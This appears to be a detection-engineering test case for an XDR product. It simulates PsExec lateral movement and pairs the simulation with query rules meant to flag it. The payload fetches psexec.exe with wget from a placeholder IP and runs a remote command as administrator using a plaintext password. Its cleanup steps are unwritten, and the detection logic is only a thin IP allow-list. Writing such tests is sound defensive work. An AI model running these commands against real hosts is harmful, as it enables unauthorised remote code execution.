identity.name: Remote service command execution from uncommon source
identity.summary: An attacker uses PsExec to execute commands on a remote Windows endpoint from an unusual source IP. Cortex should detect the execution of psexec.exe with a remote IP not typically seen in the environm
identity.description: An attacker uses PsExec to execute commands on a remote Windows endpoint from an unusual source IP. Cortex should detect the execution of psexec.exe with a remote IP not typically seen in the environment.

payload.code:
wget http://192.0.2.10/psexec.exe -O C:\temp\psexec.exe
stub C:\temp\psexec.exe
C:\temp\psexec.exe \\192.0.2.50 -u administrator -p password123 -c cmd.exe -args "/c whoami > C:\temp\output.txt"

manual_steps: Not authored. Write and test cleanup before promotion.

biocs.name: Unusual PsExec execution
biocs.description: Execution of psexec.exe from an IP address not typically seen in the environment
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = 'psexec.exe'
| filter action_remote_ip != '192.0.2.10'
| filter action_remote_ip != '192.0.2.11'
| filter action_remote_ip != '192.0.2.12'

abiocs.name: Remote service command execution from uncommon source
abiocs.description: Execution of a remote service command from a source IP address not typically seen in the environment
abiocs.logic:
dataset = xdr_data
| filter event_type = ENUM.NETWORK_CONNECTION
| filter action_remote_ip != '192.0.2.10'
| filter action_remote_ip != '192.0.2.11'
| filter action_remote_ip != '192.0.2.12'
| filter action_remote_ip != '192.0.2.13'
| filter action_remote_ip != '192.0.2.14'
